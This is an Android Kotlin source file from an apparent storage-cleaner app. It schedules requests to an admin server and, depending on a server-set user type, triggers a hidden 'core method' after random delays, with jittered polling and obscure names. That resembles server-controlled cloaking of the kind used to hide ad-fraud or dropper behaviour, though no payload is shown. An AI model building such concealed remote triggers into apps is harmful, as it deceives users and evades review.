package com.mobile.storage.clean.post

import android.content.Context
import com.mobile.storage.clean.go.GoOne
import com.mobile.storage.clean.storage.DeviceStorage
import com.mobile.storage.clean.tool.DaTool
import com.mobile.storage.clean.tool.PostTool
import kotlinx.coroutines.*
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import kotlin.random.Random

/**
 * Admin配置请求管理器
 * 职责：管理配置请求的调度、重试和用户类型处理
 */
object UserMaster {

    // 状态管理
    private val isRequesting = AtomicBoolean(false)
    private var periodicJob: Job? = null
    private var backgroundUpdateJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    /**
     * 主入口：根据当前状态启动适当的请求流程
     */
    fun getAdminJsonFun(context: Context) {
        val currentConfig = DeviceStorage.adata

        // 启动后台配置更新任务（仅启动一次）
        startBackgroundConfigUpdate(context)

        when {
            // 情况3: 无配置，立即请求
            currentConfig.isEmpty() -> {
                DaTool.showLog("UserMaster: No config, requesting immediately")
                handleNoConfigScenario(context)
            }
            // 情况1: 有配置且是a用户，延迟后请求
            isUserTypeA(currentConfig) -> {
                DaTool.showLog("UserMaster: User A with config, delayed request")
                handleUserAScenario(context)
            }
            // 情况2: 有配置且是b用户，开始定时请求
            else -> {
                DaTool.showLog("UserMaster: User B with config, starting periodic requests")
                handleUserBScenario(context)
            }
        }
    }

    /**
     * 情况3: 无配置场景 - 立即请求
     */
    private fun handleNoConfigScenario(context: Context) {
        scope.launch {
            requestAdminWithRetry(context) { isSuccess ->
                if (isSuccess) {
                    handleRequestSuccess(context)
                }
            }
        }
    }

    /**
     * 情况1: a用户场景 - 延迟后请求
     */
    private fun handleUserAScenario(context: Context) {
        scope.launch {
            // 随机延迟 1秒 到 10分钟
            val delayMs = Random.nextLong(1000L, 10 * 60 * 1000L)
            GoOne.invokeCoreMethod(context)
            DaTool.showLog("UserMaster: Delaying ${delayMs}ms before request")
            delay(delayMs)

            requestAdminWithRetry(context) { isSuccess ->
                if (isSuccess) {
                    handleRequestSuccess(context,true)
                }
            }
        }
    }

    /**
     * 情况2: b用户场景 - 定时循环请求
     */
    private fun handleUserBScenario(context: Context) {
        // 取消之前的定时任务
        cancelPeriodicRequests()

        periodicJob = scope.launch {
            while (isActive) {
                // 检查请求上限
                if (isRequestLimitReached()) {
                    DaTool.showLog("UserMaster: Request limit reached for today")
                    delay(60 * 1000L) // 等待1分钟后再检查
                    continue
                }

                // 发起请求
                requestAdminWithRetry(context) { isSuccess ->
                    if (isSuccess) {
                        handleRequestSuccess(context)
                    }
                }

                // 计算下次请求的延迟时间
                val nextDelay = calculateNextRequestDelay()
                DaTool.showLog("UserMaster: Next request in ${nextDelay}ms")
                delay(nextDelay)
            }
        }
    }

    /**
     * 后台配置更新任务 - 长时间循环请求，仅用于更新数据
     * 每隔一定时间请求admin，不执行Core方法调用
     */
    private fun startBackgroundConfigUpdate(context: Context) {
        // 如果已经在运行，不重复启动
        if (backgroundUpdateJob?.isActive == true) {
            DaTool.showLog("UserMaster: Background update already running")
            return
        }

        backgroundUpdateJob = scope.launch {
            DaTool.showLog("UserMaster: Starting background config update loop")

            while (isActive) {
                try {
                    // 计算下次更新的延迟时间
                    val updateDelay = calculateBackgroundUpdateDelay()
                    DaTool.showLog("UserMaster: Next background update in ${updateDelay / 60000}min")
                    delay(updateDelay)

                    // 检查请求上限
                    if (isRequestLimitReached()) {
                        DaTool.showLog("UserMaster: Background update skipped - request limit reached")
                        continue
                    }

                    // 发起后台请求（不带重试，只请求一次）
                    DaTool.showLog("UserMaster: Executing background config update")
                    requestBackgroundUpdate(context)

                } catch (e: Exception) {
                    DaTool.showLog("UserMaster: Background update error: ${e.message}")
                }
            }
        }
    }

    /**
     * 执行后台配置更新请求（单次，不重试）
     */
    private suspend fun requestBackgroundUpdate(context: Context) {
        // 检查请求上限
        if (isRequestLimitReached()) {
            DaTool.showLog("UserMaster: Background update request limit reached")
            return
        }

        // 增加请求计数
        incrementRequestCount()

        suspendCancellableCoroutine<Unit> { continuation ->
            try {
                PostTool.postAdminData(context, object : PostTool.CallbackMy {
                    override fun onSuccess(response: String) {
                        DaTool.showLog("UserMaster: Background update successful")
                        // 配置已通过 isCanSave 自动保存，不需要额外处理
                        if (continuation.isActive) {
                            continuation.resume(Unit) {}
                        }
                    }

                    override fun onFailure(error: String) {
                        DaTool.showLog("UserMaster: Background update failed: $error")
                        if (continuation.isActive) {
                            continuation.resume(Unit) {}
                        }
                    }
                })
            } catch (e: Exception) {
                DaTool.showLog("UserMaster: Background update exception: ${e.message}")
                if (continuation.isActive) {
                    continuation.resume(Unit) {}
                }
            }
        }
    }

    /**
     * 计算后台更新的延迟时间
     * 从配置 "date_show": "60-60" 中获取第一个数字（单位：分钟）
     * 前后随机浮动 5 分钟
     */
    private fun calculateBackgroundUpdateDelay(): Long {
        return try {
            val config = DeviceStorage.adata
            if (config.isEmpty()) {
                // 默认 60 分钟，随机 ±5 分钟
                return (60 + Random.nextLong(-5, 6)) * 60 * 1000L
            }

            val jsonConfig = JSONObject(config)
            val dateShow = jsonConfig.optString("date_show", "60-60")

            // 解析 "60-60" 格式，取第一个数字
            val parts = dateShow.split("-")
            val baseIntervalMinutes = if (parts.isNotEmpty()) {
                parts[0].toLongOrNull() ?: 60L
            } else {
                60L
            }

            // 添加随机浮动 -5 到 +5 分钟
            val randomOffset = Random.nextLong(-5, 6)
            val totalMinutes = baseIntervalMinutes + randomOffset

            // 转换为毫秒
            totalMinutes * 60 * 1000L

        } catch (e: Exception) {
            DaTool.showLog("UserMaster: Error parsing background update delay: ${e.message}")
            // 默认 60 分钟
            60 * 60 * 1000L
        }
    }

    /**
     * 处理请求成功后的逻辑
     */
    private fun handleRequestSuccess(context: Context, isCoreMethod: Boolean = false) {
        val currentConfig = DeviceStorage.adata

        if (isUserTypeA(currentConfig)) {
            // a用户：调用Core方法，结束流程
            DaTool.showLog("UserMaster: User A detected, invoking Core method")
            try {
                if (!isCoreMethod) {
                    GoOne.invokeCoreMethod(context)
                }
            } catch (e: Exception) {
                DaTool.showLog("UserMaster: Error invoking Core method: ${e.message}")
            }
            // 取消定时任务（如果有）
            cancelPeriodicRequests()
        } else {
            // b用户：如果不在定时任务中，启动定时任务
            DaTool.showLog("UserMaster: User B detected, continuing periodic requests")
            if (periodicJob?.isActive != true) {
                handleUserBScenario(context)
            }
        }
    }

    /**
     * 带重试机制的Admin请求
     * @param onComplete 完成回调，参数表示是否成功获取到配置
     */
    private suspend fun requestAdminWithRetry(
        context: Context,
        onComplete: (Boolean) -> Unit
    ) {
        // 防止并发请求
        if (!isRequesting.compareAndSet(false, true)) {
            DaTool.showLog("UserMaster: Request already in progress, skipping")
            return
        }

        try {
            val retryCount = Random.nextInt(2, 6) // 2-5次
            val totalDuration = Random.nextLong(60 * 1000L, 5 * 60 * 1000L) // 1-5分钟
            val minRetryInterval = 30 * 1000L // 最少30秒

            for (attempt in 1..retryCount) {
                DaTool.showLog("UserMaster: Request attempt $attempt/$retryCount")

                val result = withTimeoutOrNull(60 * 1000L) {
                    requestAdminOnce(context)
                }

                if (result == true) {
                    // 成功获取配置
                    DaTool.showLog("UserMaster: Request successful on attempt $attempt")
                    onComplete(true)
                    return
                }

                // 失败或超时，检查是否需要重试
                if (attempt < retryCount) {
                    val remainingAttempts = retryCount - attempt
                    val remainingTime = totalDuration - (System.currentTimeMillis() % totalDuration)
                    val retryDelay = maxOf(minRetryInterval, remainingTime / remainingAttempts)

                    DaTool.showLog("UserMaster: Retrying in ${retryDelay}ms")
                    delay(retryDelay)
                }
            }

            // 所有重试都失败
            DaTool.showLog("UserMaster: All retry attempts failed")
            onComplete(false)

        } finally {
            isRequesting.set(false)
        }
    }

    /**
     * 执行单次Admin请求
     * @return 是否成功
     */
    private suspend fun requestAdminOnce(context: Context): Boolean {
        // 检查请求上限
        if (isRequestLimitReached()) {
            DaTool.showLog("UserMaster: Request limit reached")
            return false
        }

        // 增加请求计数
        incrementRequestCount()

        return suspendCancellableCoroutine { continuation ->
            try {
                PostTool.postAdminData(context, object : PostTool.CallbackMy {
                    override fun onSuccess(response: String) {
                        if (continuation.isActive) {
                            continuation.resume(true) {}
                        }
                    }

                    override fun onFailure(error: String) {
                        DaTool.showLog("UserMaster: Request failed: $error")
                        if (continuation.isActive) {
                            continuation.resume(false) {}
                        }
                    }
                })
            } catch (e: Exception) {
                DaTool.showLog("UserMaster: Exception during request: ${e.message}")
                if (continuation.isActive) {
                    continuation.resume(false) {}
                }
            }
        }
    }

    /**
     * 判断是否为a用户
     */
    private fun isUserTypeA(config: String): Boolean {
        return try {
            DaTool.kapa(config)
        } catch (e: Exception) {
            false
        }
    }

    /**
     * 计算下次请求的延迟时间（情况2）
     */
    private fun calculateNextRequestDelay(): Long {
        return try {
            val config = DeviceStorage.adata
            if (config.isEmpty()) {
                return 60 * 1000L // 默认60秒
            }

            val jsonConfig = JSONObject(config)
            val dateShow = jsonConfig.optString("date_show", "60-60")

            // 解析 "60-60" 格式，取第二个数字
            val parts = dateShow.split("-")
            val baseInterval = if (parts.size >= 2) {
                parts[1].toLongOrNull() ?: 60L
            } else {
                60L
            }

            // 添加随机0-10秒
            val randomOffset = Random.nextLong(0, 11)
            (baseInterval + randomOffset) * 1000L

        } catch (e: Exception) {
            DaTool.showLog("UserMaster: Error parsing delay config: ${e.message}")
            60 * 1000L // 默认60秒
        }
    }

    /**
     * 检查是否达到当天请求上限
     */
    private fun isRequestLimitReached(): Boolean {
        val today = getCurrentDate()

        // 如果日期变了，重置计数
        if (DeviceStorage.lastRequestDate != today) {
            DeviceStorage.requestCount = 0
            DeviceStorage.lastRequestDate = today
        }

        val limit = getRequestLimit()
        return DeviceStorage.requestCount >= limit
    }

    /**
     * 增加请求计数
     */
    private fun incrementRequestCount() {
        val today = getCurrentDate()

        // 如果日期变了，重置计数
        if (DeviceStorage.lastRequestDate != today) {
            DeviceStorage.requestCount = 0
            DeviceStorage.lastRequestDate = today
        }

        DeviceStorage.requestCount++
        DaTool.showLog("UserMaster: Request count: ${DeviceStorage.requestCount}/${getRequestLimit()}")
    }

    /**
     * 获取请求上限
     */
    private fun getRequestLimit(): Int {
        return try {
            val config = DeviceStorage.adata
            if (config.isEmpty()) {
                return 1000 // 默认值
            }

            val jsonConfig = JSONObject(config)
            jsonConfig.optInt("lit_po", 1000)
        } catch (e: Exception) {
            1000 // 默认值
        }
    }

    /**
     * 获取当前日期（格式：yyyy-MM-dd）
     */
    private fun getCurrentDate(): String {
        val dateFormat = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
        return dateFormat.format(Date())
    }

    /**
     * 取消定时请求
     */
    fun cancelPeriodicRequests() {
        periodicJob?.cancel()
        periodicJob = null
        DaTool.showLog("UserMaster: Periodic requests cancelled")
    }

    /**
     * 取消后台更新任务
     */
    fun cancelBackgroundUpdate() {
        backgroundUpdateJob?.cancel()
        backgroundUpdateJob = null
        DaTool.showLog("UserMaster: Background update cancelled")
    }

    /**
     * 清理资源
     */
    fun cleanup() {
        cancelPeriodicRequests()
        cancelBackgroundUpdate()
        scope.cancel()
    }
}